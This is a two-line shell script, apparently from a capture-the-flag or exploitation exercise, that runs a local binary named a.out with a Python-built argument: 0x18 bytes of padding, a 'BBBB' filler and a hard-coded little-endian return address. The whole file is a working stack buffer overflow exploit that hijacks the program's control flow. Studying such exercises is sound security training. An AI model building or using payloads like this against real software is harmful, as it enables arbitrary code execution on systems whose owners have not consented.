#!/bin/sh
./a.out "$(python -c 'print "A"*0x18 + "BBBB" + "\x6b\x84\x04\x08"')"
